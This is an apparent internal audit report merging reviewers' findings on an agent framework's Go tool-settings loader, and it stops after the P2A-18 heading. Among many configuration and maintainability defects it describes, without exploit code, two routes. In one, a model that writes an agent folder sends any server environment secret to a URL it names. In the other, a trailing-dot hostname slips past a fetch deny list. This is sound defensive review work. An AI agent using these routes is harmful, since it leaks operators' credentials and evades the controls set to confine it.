# Phase p2a merged findings — sessionfs `native_*` tool settings + `layouttest`

- phase: `p2a`, reviewed at HEAD `fbe49a8` (go1.27.3 linux/amd64, git 2.56.0). Worktree before and after this merge: only the pre-existing `M EXECUTOR.md`, `M MASTER.md`, untracked `audit_findings/`, `nodir/`; `git stash list` empty.
- inputs: `p2a_r1.md` (204 lines, 14 findings, 3 hypotheses), `p2a_r2.md` (179, 6, 3), `p2a_r3.md` (187, 11, 7), `p2a_r4.md` (161, 5, 3). File mtimes r3 11:16, r2 11:17, r1 11:48, r4 13:13 are consistent with the finish order (r1 and r4 were stopped and restarted); no reviewer cites another's file.
- coordinator work: merge and verification only. **No repository file was changed** — no source, config, `sample/`, or git state (checked before and after). This step ran no benchmark, no `-race` and no full suite; the measurement step is separate. Two verifications executed code (a Go URL-parse probe in `/tmp/p2a-merge`, and the overflow arithmetic); everything else is a source read at `fbe49a8`.
- load average: 0.71 at the start, 0.53 at the end (12 CPUs). Nothing here is a timing claim.
- scope: the 24 non-test `internal/sessionfs/native_*.go` files (4,845 lines) and `internal/sessionfs/layouttest/layouttest.go` (355), 5,200 lines, per `audit_plan.md` phasemap.
- **Verification outcome: 36 reviewer filings → 22 merged findings; all 22 confirmed, 0 disproved, 0 unverified.** Four "checked and sound" claims are refuted (§5, C1-C4); 8 contradictions are recorded.

## 1. Counts

| measure | count |
|---|---|
| reviewer findings filed | 36 (r1 14, r2 6, r3 11, r4 5) |
| merged findings | 22 (every filing carried; 0 dropped as prior art except the re-confirmation in P2A-01, 0 promoted from cross-phase leads) |
| entries that merge several filings | 7: P2A-05 (4 filings), P2A-07 (4), P2A-01 (3), P2A-03 (3), P2A-08 (3), P2A-11 (2), P2A-12 (2) = 21 filings; the other 15 entries hold one filing each (36 total) |
| consensus (2+ reviewers) | 7: P2A-01 (r1, r3, r4), P2A-05 (r2, r3, r4), P2A-07 (r1, r2, r3), P2A-08 (r1, r2, r3), P2A-03 (r1, r4), P2A-11 (r2, r3), P2A-12 (r1, r3) |
| unique (one reviewer) | 15 |
| by number of finders (reviewers) | 3: 4 · 2: 3 · 1: 15 |
| severity proposed: critical / high / medium / low | 0 / 0 / 5 / 17 |
| severity as filed (36 filings) | critical 0 / high 0 / medium 10 (r1 6, r3 4) / low 26 |
| verification: executed probe / confirmed by reading source / disproved / unverified | 3 executed at merge time, 22 read-confirmed (the 3 are also read-confirmed), 0 disproved, 0 unverified. §12 executed 4 more (P2A-02, P2A-03, P2A-09, P2A-10): **7 of the 22 now have an executed probe**, 15 rest on the read |
| every unique (15) and every medium-or-higher (5) finding verified — 20 distinct | 20 confirmed, 0 refuted, 0 unverified |
| "checked and sound" claims refuted (fully or partly) | 4 (C1, C2, C3, C4 in §5) |
| contradictions recorded | 8 (C1-C8) |
| performance hypotheses | 16 raw (r1 3, r2 3, r3 7, r4 3) → 5 for measurement: 12 filings merge into the 5 groups (r2 H3 spans two of them), 4 are closed without measurement (r1 H03, r3 H05-H07); §9, results in §12 (4 confirmed, 2 partly) |
| repeats of prior art | 1 re-confirmation (P2A-01 = p4 **M23**, still open at `fbe49a8`); no other filing repeats a fixed item (grepped `audit_backend.md`, `audit_audit.md`, `audit_performance_plan.md`, `audit_design*.md`, `p1_merged.md`, `p4_merged.md` for `prompt_documents`, `agents_dir`, `allowed_hosts`, `unsupportedToolKey`, `read_image`, `env_file`, trailing-dot hosts and IPv6: no hits) |

Per reviewer (entries, not filings): r1 13 entries from 14 filings — 5 consensus, 8 unique, 6 filings rated medium; r2 6 — 4 consensus, 2 unique, 0 medium; r3 9 entries from 11 filings — 6 consensus, 3 unique, 4 medium; r4 5 — 3 consensus, 2 unique, 0 medium. Consensus memberships 5+4+6+3 = 18 over 7 entries (P2A-01 3, P2A-05 3, P2A-07 3, P2A-08 3, P2A-03 2, P2A-11 2, P2A-12 2); unique 8+2+3+2 = 15.

## 2. Merged findings

`found by` lists the reviewer filings that map here. `sev` is the coordinator's rating; `filed` is what the reviewer(s) said. Status: **R** = an execution reproduced it in this merge, **S** = confirmed by reading source at `fbe49a8` (some also rely on a reviewer's own probe, noted per entry). A `-` in `filed` means no reviewer filed the entry.

| id | title | sev | filed | lens | location | found by | status |
|---|---|---|---|---|---|---|---|
| P2A-01 | `retention_days` / `unread_ttl_days` accept 10,000,000 days; the `time.Duration` product overflows and prune deletes every unread signal, finished record and result file | medium | m,l,l | A/B | `native_async_settings.go:10,79-86`; `asyncmgr/prune.go:84,114,138`; `asyncmgr/config.go:97`; `tools/native/shell_async.go:114,133` | r1-01, r3-05, r4-02 (= p4 M23) | R |
| P2A-02 | An `agents_dir` folder may name any model file, and that file picks `api_key_env` and `base_url`: a model that can write an agent folder can send any server environment variable to a URL of its choice | medium | m | B | `native_subagent_settings.go:482-489`; `native_subagent_dir.go:69-101,154`; `session.go:967-1006`; `app/subagent.go:51,62,174-188`; `app/resolver.go:476,491`; `app/config.go:82-83` | r1-02 | S |
| P2A-03 | `prompt_documents` (and `env_file`) are read with `os.ReadFile` and no regular-file or size check on every settings load: a FIFO blocks the load, `/dev/zero` kills the process | medium | m,l,l | A/B,C | `native_subagent_settings.go:555-575`; `native_bash_env.go:12-18`; `native_env_file.go:15-30`; `native_subagent_dir.go:145` | r1-03, r1-06, r4-05 | S |
| P2A-04 | `SubagentChangeTools` omits `tool_smith`, `subagent` and `profile_message`: an agent that lists one is "read-only" for checkpoints, scheduling, hand-off and the `paths` guard | medium | m | A/B | `native_subagent_settings.go:159,649-660`; `native_subagent_paths.go:80-100`; `tools/native/subagent.go:100,371-385,458,519-545`; `subagent_call.go:68-83` | r1-04 | S |
| P2A-05 | `process`, `task` and `memory` `statecontext` silently ignore unknown keys, while `subagent` rejects them with a suggestion | low | l,m,m,l | A/D | `native_process_settings.go:272-313`; `native_task_settings.go:172-213`; `native_memory_settings.go:239-300`; vs `native_subagent_settings.go:380-384` | r2-01, r3-01, r3-02, r4-01 | S |
| P2A-06 | `sample/schemes/setting.schema.json` has drifted from the loader in five places (a nested key, two maxima, 15 missing maxima, a missing `maxItems`, a shared default) | low | l | D | `sample/schemes/setting.schema.json` (memory selector, fetch limits, bash_style spill); loader: `native_memory_settings.go:121-167,229,266-279`; `native_fetch_settings.go:26,101-106`; `native_bash_settings.go:37,336` | r2-02 | S |
| P2A-07 | The `tools` → `native` → section envelope is copied 18 times, the five storage-dir resolvers and ten list readers likewise, and the copies have already diverged (null rule, unknown-key helper) | low | m,l,l,l | D | 18 `native_*_settings.go` preambles; five `normalizeNative*StorageDir`; `native_bash_settings.go:411-426`; 10 files use `unsupportedToolKey`, 7 use a plain `is not supported` | r1-11, r2-03, r3-07, r3-09 | S |
| P2A-08 | Explicit `null` and value-type rules differ between sections and between copies of the same rule | low | l,l,l | A/D | `native_memory_settings.go:176-180`; `native_profile_message_settings.go:133-138`; `native_process_settings.go:274`; `native_task_settings.go:174`; `native_bash_settings.go:241-250,380` | r1-07, r2-04, r3-10 | S |
| P2A-09 | `fetch.denied_hosts` / `allowed_hosts` are not normalised the way a URL host arrives, so a trailing-dot host (`example.com.`) skips a deny entry for `example.com` | medium | m | B | `native_fetch_settings.go:37,188-211`; `tools/native/fetch.go:401-411,459-465` | r1-09 | R |
| P2A-10 | The fetch host lists cannot name an IPv6 literal, so a public IPv6 target cannot be denied | low | m | B | `native_fetch_settings.go:37,201`; `tools/native/fetch.go:405-430,466` | r3-03 | R |
| P2A-11 | The `NativeReadImageSettings` comment says `read_image` uses the read tool's path policy; the loader gives it its own `paths` and never reads the read policy | low | l,m | D/B | `native_read_image_settings.go:12-13,54-59`; `session.go:401` | r2-05, r3-04 | S |
| P2A-12 | `layouttest`: `withAsync` hides the "needs async" loader rule, `Spec.Defaults` is set by no test, and four JSON writers are near-identical | low | l,l | D | `layouttest.go:33-34,101-113,149,170,271-282,306,331-337,339-355` | r1-13, r3-11 | S |
| P2A-13 | An empty non-nil `Spec.Models` map panics the layout fixture (`listed[0]`) instead of failing the test | low | l | D | `layouttest.go:160-166,193-196` | r4-04 | S |
| P2A-14 | Exec runner `argv` items are only checked non-empty: no length or NUL bound, so a bad entry fails at call time instead of load | low | l | B | `native_exec_settings.go:288-300`; `native_tool_smith_settings.go` reuses it | r1-08 | S |
| P2A-15 | A duplicated key in the inline `agents` object yields two agents of the same name, both built from the last object | low | l | A | `native_subagent_settings.go:336-356`; `session.go:1224-1250` (`orderedObjectKeys` returns duplicates) | r1-05 | S |
| P2A-16 | `transcript` has no cross-field rules while `transcripts` and `async` have them (`line_max_bytes` may exceed `scan_max_bytes`) | low | l | A | `native_transcript_settings.go:90-109`; `native_transcripts_settings.go:111-113` | r1-10 | S |
| P2A-17 | `NativeSubagentSettings` has four "hand-built struct" zero-value contracts that disagree with the loaded defaults, and the file mixes six responsibilities | low | l | D | `native_subagent_settings.go:89-129,472-655` (670 lines) | r1-12 | S |
| P2A-18 | Each `agent.json` of an `agents_dir` is read and parsed twice, so the key allow-list and the values can come from different file versions | low | l | A/C | `native_subagent_dir.go:110-137` | r2-06 | S |
| P2A-19 | `NativeSubagentAgent.Tools` is documented as "read-only native tools" although the loader and `SubagentChangeTools` accept change tools | low | l | D | `native_subagent_settings.go:183-186,159,649-660` | r4-03 | S |
| P2A-20 | `request_draft`: `headless_auto_accept_timeout_ms` is not bounded by `max_timeout_ms`, so the headless wait can be 1800x the advertised maximum | low | l | A | `native_request_draft_settings.go:72-80` | r3-06 | S |
| P2A-21 | `process.env_deny` does not trim whitespace while the bash/exec/tool_smith reader does, so `" FOO"` loads for one and fails for the other | low | l | D | `native_process_settings.go:216-229` vs `native_bash_settings.go:287-305` | r3-08 | S |
| P2A-22 | Test gaps for this phase's new keys and defects, and one key-agreement test with an incomplete tool list | low | l | D | `native_async_settings_test.go:57-88`; `native_tool_schema_test.go:35-56`; see §4 | r1-14 | S |

Severity rule applied: highest evidence, median severity (`audit_plan.md` 6.2), with two deliberate departures recorded in C8: P2A-05 and P2A-07 take the median **low** against r3's / r1's medium, and P2A-01 is rated **medium** against p4's low for M23 (see §4).

## 3. Verification, consensus findings

### P2A-01 (medium, A/B) Async retention days overflow `time.Duration` — r1-01, r3-05, r4-02 — **confirmed; this is p4 M23, still open**
- loader: `maxNativeAsyncValue = 10_000_000` is the cap for every async key (`native_async_settings.go:10`), and `retention_days` / `unread_ttl_days` get `minimum = 0`, `maximum = 10_000_000` (`:80-86`). `asyncmgr.Config.Validate` rejects only a negative value (`config.go:97-99`) — no upper bound.
- consumer: `prune.go:84` and `:114` compute `now.Add(-time.Duration(days) * 24 * time.Hour)`; `noteExpiryLocked` (`:138`) does the same with `+`. `tools/native/shell_async.go:114,133` takes `max(retention, ttl)` and deletes every result file older than that cutoff.
- arithmetic (recomputed in this merge, int64 wrap): 106,751 days → **9.223e18 ns** (fits); 106,752 → **-9.223e18 ns** = `-2562047h` → `now.Add(-d)` is **2562047 h in the future**; 200,000 → future; 1,000,000 → future; 10,000,000 → `-832492h` → future. With a future cutoff, `r.changed.Before(cutoff)` (`prune.go:87`) is true for every unread signal (all flipped to read and counted `dropped`), `finished[drop].changed.Before(cutoff)` (`:115`) drops every finished record beyond `keep_finished`, and `sweepShellResults` (`shell_async.go:135`) deletes every stored result file.
- reach: `pruneLocked` runs from `wait.go:41`, `manager.go:421` and `recover.go:85`, i.e. on the default path once `tools.native.async` is configured (which process/subagent/tool_smith require, `session.go:501`). The trigger is one documented-valid config number: the schema's `maximum` for the two keys is 10,000,000 as well (checked in `setting.schema.json`).
- prior art: p4 **M23** (`p4_merged.md:53,154`) reproduced the same overflow and rated it low. `git log --oneline -- native_async_settings.go asyncmgr/config.go` since p4 shows only `86552a4` (the `latest_*` keys), so the defect is unchanged; r3 and r4 both re-confirmed it independently.
- **severity: medium** (departure from p4's low, C8): the value is documented as legal in the schema the project pins by test, the effect is silent destruction of unread completion signals and result files at the next prune, and the fix is a two-line cap. Not high: async is opt-in and the trigger is a config author's number.
- fix (S): cap both keys at a duration-safe value (36,500 as p4 proposed, or 106,751) in the loader **and** in `Config.Validate`, mirror `sample/schemes/setting.schema.json`, add the boundary rows to the bad-input table. Because M23 owns the same two lines, one change should close both ids.

### P2A-05 (low, A/D) `process`/`task`/`memory` statecontext ignore unknown keys — r2-01, r3-01, r3-02, r4-01 — **confirmed**
- `normalizeNativeProcessStateContext` reads `states`, `limit`, `mode`, `detail_states` and never compares the key set (`native_process_settings.go:272-313`); `normalizeNativeTaskStateContext` likewise (`native_task_settings.go:172-213`); each `memory` selector is decoded and only `type`, `filter`, `exclude_any`, `group_by`, `limit` are read out of it (`native_memory_settings.go:239-300`). `normalizeNativeSubagentStateContext` does loop and rejects with `unsupportedToolKey` plus a did-you-mean (`native_subagent_settings.go:380-384`).
- the schema proves the split was not designed: `subagent.statecontext` has `additionalProperties: false`, `memory.statecontext.items` has `additionalProperties: false` (and rejects the `exclude_any` the loader accepts — P2A-06) while `process.statecontext` and `task.statecontext` have `additionalProperties: true` (all four checked programmatically in this merge).
- r2's probe through the real catalog loader (`layouttest` `ToolsetRaw`) shows the typo case end to end: `{"native":{"async":{},"process":{"statecontext":{"state":["running"],"limit":5}}}}` loads with no error and the default `states`, while the same typo under `subagent` fails with a suggestion.
- effect: a typo (or a writer that emits an old key) silently produces the documented defaults; bounded by `limit`. No data or security effect. r3 rated both filings medium; r2 and r4 low → **low** (median, C8).

### P2A-07 (low, D) The section envelope and its helpers are copied and have diverged — r1-11, r2-03, r3-07, r3-09 — **confirmed, counts corrected**
- preamble: `toolFields, err := decodeConfigObject(...)` appears **18 times in 18 files** (`grep -c`), `tool_settings.go:126-147` holds a 19th for `read`. The copies differ in two observable ways: **9 of 18** repeat `strings.TrimSpace(string(nativeRaw)) == "null"` (counted: 9 files) and 9 do not, and 10 files use `unsupportedToolKey` while 28 sites print a plain `... is not supported` (`grep` counts at this HEAD).
- storage dirs: five `normalizeNative*StorageDir` with identical bodies (`native_fetch_settings.go:213`, `native_memory_settings.go:200`, `native_process_settings.go:249`, `native_subagent_settings.go:416`, `native_task_settings.go:149`) plus a sixth shape in `native_bash_settings.go:333-459` for the spill dir. The error text already differs (`configError` in subagent, `fmt.Errorf("resolve ...")` in fetch).
- name patterns: three copies of `^[A-Za-z0-9][A-Za-z0-9_-]{0,63}$` — `native_profile_message_settings.go:216`, `native_subagent_settings.go:62`, `remote/entry.go:44`.
- `normalizeNativeSubagentStateContext`'s error text lists `(queued, running, done, failed, timed_out, stopped)` while `allowedNativeSubagentStates` also allows `lost` (`native_subagent_settings.go:58-60` vs `:394`) — r1-11's item 5, confirmed.
- r1 rated this medium ("largest maintainability cost of the phase"); r2 and r3 low → **low** by the median rule, with the note that this is the phase's biggest structural risk: three of the 22 merged findings (P2A-05, P2A-08, P2A-15) are drift between these copies.
- fix is optional and separable: two helpers (`nativeSection`, `configuredStorageDir`) remove ~300 lines and make one rule apply to all 20 sections. Do not touch the types: F-22 is closed as intentional.

### P2A-08 (low, A/D) `null` and value-type rules differ — r1-07, r2-04, r3-10 — **confirmed**
- `memory.allowed_types: null` → `json.Unmarshal` yields nil and the nil check reports "must contain safe type names" (`native_memory_settings.go:176-180`); `profile_message.compact: null` is folded into the "must be off or on" error (`native_profile_message_settings.go:134-138`); `deny_profiles: null` right beside it is accepted (`:172-174`).
- `statecontext: null` means defaults for `subagent` (`native_subagent_settings.go:372`) but an error for `process`/`task` (`native_process_settings.go:274` only guards `len(raw)==0`; the same at `native_task_settings.go:174`) and for `memory` (`native_memory_settings.go:229`, `rawSelectors == nil`).
- `kill_children_on_run_end` is the string `"on"`/`"off"` while its neighbours are JSON booleans (`native_bash_settings.go:241-250`), and the spill legacy guard compares raw JSON text against `"\".bash-output\""` (`:380`), so an escaped spelling is treated as a non-default.
- `nullableField` documents the intended rule ("treating an explicit null like an absent key", `native_exec_settings.go:372-379`); the four sites above do not follow it. Both behaviours are pinned by tests today, so a fix updates the test tables in the same commit.
- Severity: all three filings low → **low**. Effect is a hard load error for a config that another section accepts, never a bypass.

### P2A-03 (medium, A/B) Unbounded `os.ReadFile` of config-referenced files — r1-03, r1-06, r4-05 — **confirmed, one r1 location corrected**
- `loadSubagentPrompt` resolves each `prompt_documents` entry (`expandHome`, relative to cwd), then `os.ReadFile` with **no** `Stat`, regular-file check or byte limit (`native_subagent_settings.go:555-575`). `agent.json` and `prompt.md` *are* guarded by `regularFileExists` (`native_subagent_dir.go:111,140,165-174`) but `prompt.md` is still read whole (`:145`).
- `loadNativeBashEnvFile` is the same primitive (`native_bash_env.go:12-18`), reached from `loadConfiguredEnvFile` (`native_env_file.go:15-30`) by bash, exec, process and (out of phase) hooks.
- effect: reading a FIFO blocks in `open(2)` until a writer appears, and the loader runs on every `LoadSessionSettings` — every message resolve, catalog listing and storage-recovery pass (DECISIONS 582 states the per-message re-read); `/dev/zero` never returns and grows the buffer until the process dies. r1 measured both (`/tmp/r1`: a FIFO blocked past 1.5 s; `/dev/zero` under `ulimit -v 3000000` died with `fatal error: out of memory`); I re-read the code, not the probes.
- r4-05's location list also names `native_subagent_dir.go:143-151` for `prompt.md`, so the "no byte ceiling" half covers all four reads; r1-03's "no regular-file check" half applies to `prompt_documents` and `env_file` only.
- reach: an operator typo pointing at a device file, or the model writing an `agent.json` with `prompt_documents` into a tree it can write (DECISIONS 310/580 make the model the intended creator of agent folders), and `env_file` from a config author.
- severity: r1-03 medium, r1-06 and r4-05 low → **medium** for the merged item because one entry can take down the whole server process (not just the request) with a documented-valid config; the process-kill variant is what lifts it above the "operator typo" class. Fix (S): `Stat` + `Mode().IsRegular()` + `io.LimitReader` behind one helper (`readConfigTextFile`), with the cap a new documented setting.

### P2A-11 (low, D/B) `read_image` policy comment contradicts the code — r2-05, r3-04 — **confirmed; r3's medium lowered**
- the type comment says "The path policy is not a key of this tool: it is the read tool's policy, so one setting governs both" (`native_read_image_settings.go:12-13`); the key list contains `paths` (`:10`), the normaliser builds `Policy` from its **own** `fields["paths"]` (`:54-59`) and does not even receive the read policy (`:19`), while `normalizeNativeTranscriptSettings` does take `readPolicy` (`native_transcript_settings.go:55,90`). The loader passes no read policy to read_image (`session.go:401`), and two tests pin the real behaviour (`native_read_image_settings_load_test.go:12,33`).
- consequence measured by reading the consumer: `readImageFile` resolves the path with `execution.WorkspaceRoot` **and the tool's own policy** (`internal/tools/native/image_file.go:34`), so an operator who writes `read.paths: {allow:["/safe"]}` confines `read` but not `read_image`; the default for `read_image` is an empty policy, i.e. the workspace root (`resolveExistingTarget`).
- r3 filed it as medium B (a confinement gap); r2 as low D (a misleading comment). Both describe the same two lines. **low**: the operator can configure `read_image.paths`, the exposure stays inside the workspace by default, and which side moves is a decision (§11), not a clear defect. A reader who trusts the comment, however, believes a security control applies that does not.

### P2A-12 (low, D) `layouttest` masks the async requirement and carries dead/duplicated code — r1-13, r3-11 — **confirmed**
- `withAsync` adds `"async": {}` whenever `native` names `process`, `subagent` or `tool_smith` (`layouttest.go:339-355`), and both `Write` and `AddSession` apply it, so no fixture can express `{"native":{"process":{}}}` without async and the loader error at `session.go:501` is unreachable through the shared helper (r3-11). r1-13 adds that the one test of the rule has to route around the helper via `ToolsetRaw`.
- `Spec.Defaults` is read by `Write` (`:137-138`) and **set by no test** in the repository (`grep -rn "Defaults:" --include=*_test.go internal/` → no hits) — a dead fixture knob.
- JSON writers: a `put` closure at `:101-113` and another at `:271-282`, plus inline `MkdirAll`+`WriteFile` blocks at `:149`, `:170`, `:306`, `:331` — six copies of the same four statements.
- Severity low (test-only). Fix (S): one `writeJSON(t, path, value)`, delete `Defaults`, add one negative layout case that bypasses `withAsync`.

## 4. Verification, unique findings

### P2A-02 (medium, B) An agent folder chooses the child's model file — r1-02 — **confirmed by reading the whole chain; not executed**
- the folder's `model` is resolved with `resolveFrom(settingDir, expandHome(model))` and no containment (`native_subagent_settings.go:482-489`); `settingDir` is the agent folder (`native_subagent_dir.go:154`), and `agents_dir` entries resolve against the session cwd (`native_subagent_dir.go:45`). Nothing requires the value to be a catalog model ID: `resolveSubagentModels` only rewrites values that do **not** end in `.json` (DECISIONS 549).
- the model file then supplies the credential source and the destination: `loadModel` accepts any `api_key_env` matching `environmentNamePattern` (no allow-list of provider keys, `session.go:971-977`) and any http/https `base_url` (`:935-942`), returning `Model{APIKeyEnv, BaseURL, ...}` (`:1002-1014`).
- the child uses exactly those: `subagentLauncher.childConfig` sets `config.ModelPath` and calls `config.WithModel()` (`app/subagent.go:174-188`), then `providerAPIKey` reads `r.environment[config.Model.APIKeyEnv]` — the server's whole environment with only `JAD_API_TOKEN` removed (`app/config.go:82-83`, `app/resolver.go:476`) — and `newProviderStreamer` sends it as the bearer key to `config.Model.BaseURL` (`resolver.go:491`, `app/subagent.go:51,62`). No `JAD_*` restriction exists here, unlike `remote/entry.go:47` for `token_env`.
- reach: `DECISIONS.md` "The subagent tool loads with zero agents" states the model is *expected* to create its own agent folders, that `agents_dir` is relative to the session cwd, and that a folder created during a run is read at the next message's `LoadSessionSettings`. `write` to the cwd is allowed by default (p1 §13.4 measured it). So a session with `tools.native.subagent` + `write` and no model-writable-catalog permission can send any environment variable (provider keys, `JAD_REMOTE_*` tokens) to an attacker-named https host, in one `subagent` call.
- not executed: no network is allowed in this step, so the last hop (an actual request to a foreign host) rests on the code path above. Everything up to `openaiapi.NewClient{APIKey, BaseURL}` is read-verified.
- severity: r1 filed medium and proposed high "if the chain is confirmed end to end". I keep **medium**: the chain is confirmed by reading, not by execution, and it needs `tools.native.subagent` with an `agents_dir` plus `write` in the profile. It is the phase's strongest security item; promotion to high after one `httptest` end-to-end test is the natural next step (§11).
- fix (M): treat a folder/inline `model` as a catalog ID only (or require a `.json` path under the catalog models dir), and/or refuse an `api_key_env` the session's own model did not already use. A containment check in `buildNativeSubagentAgent` alone would break the documented shared-folder use.

### P2A-04 (medium, A/B) `SubagentChangeTools` omits three tools that can change files — r1-04 — **confirmed**
- the list is `{"write","edit","bash","exec","process"}` (`native_subagent_settings.go:159`) and `ChangesFiles` is `len(ChangeTools()) > 0` (`:649-660`). A child **can** be given `tool_smith`, `subagent`, `profile_message` (and `async`) when its `tools` list names them and the session enables them: the tool pool rejects only an unregistered name, with a dedicated message for each of those four (`tools/native/subagent.go:519-545`), and a nested `subagent` additionally needs `max_depth >= 2` (`:320-330`).
- four consequences, all read-confirmed: (1) `callMayChangeFiles` returns false (`subagent.go:371-385`), so the parent takes no checkpoint before the call, the call is not serialised with the other calls of its response, and `changeMarker` prints nothing (`:458`); (2) `checkSubagentPaths` refuses `paths` only with `bash`/`exec`/`process` (`native_subagent_paths.go:84-100`), so `tools:["write","tool_smith"]` + `paths: {allow:["src"]}` **loads** while `tool_smith` runs arbitrary code — exactly the "error instead of a false promise" the function's comment promises; (3) `profile_message`'s own `MayChangeFiles` is always true (`tools/native/profile_message.go:278`), and a child may start one; (4) with `changes == false` the run is handed off as an async handle whenever the async tool exists (`subagent_call.go:82`), i.e. a "read-only" agent that can change files runs detached while `background_writers` is off (`subagent.go:100` gates only agents whose `ChangesFiles()` is true).
- prior art: new. DECISIONS 333 documents the list as it stands for the *shell* tools and predates making `tool_smith`/`subagent`/`profile_message` listable for agents (DECISIONS 726/933); DECISIONS 893 states a `tool_smith` run "is as powerful as exec/bash".
- severity: medium (r1's). The decision of what `subagent` and `profile_message` mean for a checkpoint is a design choice, so the fix's size depends on it (§11).

### P2A-06 (low, D) The settings schema drifted from the loader in five places — r2-02 — **confirmed (schema re-read programmatically)**
1. `memory.statecontext.items` has `additionalProperties: false` and no `exclude_any` property; the loader reads `exclude_any` (`native_memory_settings.go:266-279`) and a loader test uses exactly that document (`native_memory_settings_test.go:29`). A schema-valid editor rejects a working, tested setting.
2. `fetch.default_limit` / `fetch.max_limit` say `maximum: 10000000`; the loader caps both at `defaultNativeFetchDocumentChars = 1_000_000` (`native_fetch_settings.go:26,101-106`).
3. `$defs.bash_style.properties.spill.properties.storage_dir.default` is `".bash-output"` and `exec` `$ref`s `bash_style`; the loader gives exec `defaultNativeExecSpillDir = ".exec-output"` (`native_bash_settings.go:37,336`), and `TestExecSpillDefaultsToItsOwnDirectoryNotBashs` pins it.
4. 15 of the 16 `memory` integer keys carry a `minimum` and **no** `maximum` (only `cursor_ttl_ms` has one), while the loader bounds each (`native_memory_settings.go:121-167`).
5. `memory.statecontext` has no `maxItems`; the loader caps the list at 128 (`:229`).
- why it survived: the parity tests compare key **names** for 7 sections and 5 fetch **defaults**; none compares a `minimum`/`maximum`, a nested key set or a nested default (`native_tool_schema_test.go:35,157`; `native_fetch_settings_test.go:95`).
- severity low (r2's). Effort M, one file plus one test.

### P2A-09 (medium, B) A trailing-dot host skips a `fetch` deny entry — r1-09 — **confirmed and reproduced**
- the loader forbids a trailing dot in an entry: `nativeFetchHostPattern = ^[a-z0-9](?:[a-z0-9.-]{0,251}[a-z0-9])?$` (`native_fetch_settings.go:37`), and `nativeFetchHosts` only lower-cases and de-duplicates (`:188-211`).
- the tool compares the URL's host name to the lists with `strings.ToLower(parsed.Hostname())` and `containsHost` (`EqualFold`) (`tools/native/fetch.go:401-411,459-465`). Reproduced in this merge with the real stdlib calls (`/tmp/p2a-merge/dot.go`, `go run`, exit 0): `url.Parse("https://Example.COM./x").Hostname()` is `"Example.COM."` → lower-cased `"example.com."`, which never equals the entry `"example.com"`, while the rooted name resolves to the same addresses.
- therefore `denied_hosts: ["example.com"]` does not cover `https://example.com./…`; the same gap makes `allowed_hosts` refuse the rooted spelling (fail-closed, harmless). `isPublicFetchAddress` still blocks loopback/private targets, so this defeats a host policy on public hosts only.
- actor: the model chooses the URL and the policy is the operator's control for a prompt-injected model. Severity **medium** (r1's): one character bypasses the deny list. Fix (S): strip one trailing `.` from both sides before comparing (loader and tool, as r1 suggests), plus a rooted-spelling test row.

### P2A-10 (low, B) The fetch host lists cannot name an IPv6 literal — r3-03 — **confirmed and reproduced**
- `nativeFetchHostPattern` allows no `:`, so `allowed_hosts: ["::1"]` and `denied_hosts: ["2001:db8::1"]` both fail at load with "must contain host names or IP addresses" (`native_fetch_settings.go:37,201`).
- the consumer handles IPv6 end to end: `parsed.Hostname()` of `https://[2001:db8::1]/x` is `2001:db8::1` (reproduced with the same Go probe), `net.ParseIP` accepts it, and `isPublicFetchAddress` classifies it (`fetch.go:405-430,466`). So the loading path is fine and only the lists are limited.
- effect: an operator cannot pin or deny a specific **literal** IPv6 target; a deny by **name** still covers both families, and `allowed_hosts` being empty means "any public host" either way.
- severity: r3 filed medium; I lower it to **low**: it needs the operator to want a literal-IPv6 entry and the model to reach that exact literal, whereas name entries already cover AAAA targets. Fix is a decision (§11): accept `net.ParseIP`-shaped entries, or document "host names and IPv4 literals only".

### P2A-13 (low, D) Empty model map panics the fixture — r4-04 — **confirmed by reading**
- `models == nil` selects the default model file (`layouttest.go:160-166`); a **non-nil empty** map leaves `modelIDs` empty, and the default profile then evaluates `listed[0]` (`:193-196`). `NoSession` does not bypass profile generation. That is an `index out of range` panic, not a `t.Fatal`, so the failure points at the helper instead of the fixture. r4 did not reproduce it; the slice-index is unambiguous, so I did not write a test for it in this step.
- severity low (test-only). Fix (S): `t.Fatal` on an empty model list before the index (or skip the default profile).

### P2A-14 (low, B) `argv` items are not bounded — r1-08 — **confirmed**
- `native_exec_settings.go:288-300` requires 1..32 entries, each a non-empty string (`maxNativeExecArgv`); there is no per-item length limit and no NUL check. A `\u0000` in an item reaches `exec.Command`, which fails at call time with `invalid argument` instead of at load. `tool_smith.interpreter` reuses the same reader, and the number of `runners` entries is unbounded.
- reach is the config author only (they already run commands), which is why r1 listed it "so the merge can drop it". Kept, **low**.

### P2A-15 (low, A) Duplicated inline agent name yields two agents — r1-05 — **confirmed**
- `orderedObjectKeys` appends a key for **every** member, duplicates included (`session.go:1224-1250`); the inline loop iterates that list while the values come from the decoder's map, which keeps the **last** object (`native_subagent_settings.go:336-356`: `agentFields[name]`). So `{"a":{…},"a":{…}}` produces `len(Agents) == 2`, both named `a`, both from the second object; `taken[name]` is written but never checked for inline names. Folder duplicates **are** refused (`native_subagent_dir.go:94-96`), and DECISIONS 310 says "the same name twice is an error and neither wins silently".
- severity low. Fix (S): reject a repeated name in the inline loop with the same "defined twice" message.

### P2A-16 (low, A) No cross-field rules for `transcript` — r1-10 — **confirmed**
- nine integers, each bounded independently (`native_transcript_settings.go:91-109`), no relation between them; `transcripts` enforces `max_entries <= scan_max_entries` (`native_transcripts_settings.go:111-113`) and `async` runs thirteen rules in `Config.Validate`. So `line_max_bytes: 268435456` with `scan_max_bytes: 1` loads, and every non-empty transcript then fails the scan. `value_bytes` may exceed a configured `preview_bytes` (both maxima are the same constant), and `response_max_bytes: 1` silently makes the detail page the minimum of the two.
- severity low. Fix (S): `line_max_bytes <= scan_max_bytes`, `value_bytes <= preview_bytes`, with test rows.

### P2A-17 (low, D) Zero-value contracts and file size — r1-12 — **confirmed**
- six comments state a meaning for the zero value that differs from the loaded default: `ProcessMaxRunning` zero = no limit, `MaxBackgroundWriters` zero = no limit, `MaxDepth` zero = 1, `MaxRunsPerRoot`/`MaxRunsPerSession` zero = no limit, `ListMaxBytes` zero = "ask", `PersistRuns`/`DeleteTranscripts` zero = off (`native_subagent_settings.go:89-129`), and the consumers do `max(int(s.settings.MaxDepth), 1)` (`subagent_call.go:49`). Every consumer must know both meanings.
- the file is 670 lines and mixes the section, state context, storage dir, per-agent build, prompt reading and four optional readers. Severity low; a split plus one `withDefaults` is worth doing only alongside another change here.

### P2A-18 (low, A/C) `agent.json` is read twice — r2-06 — **confirmed**
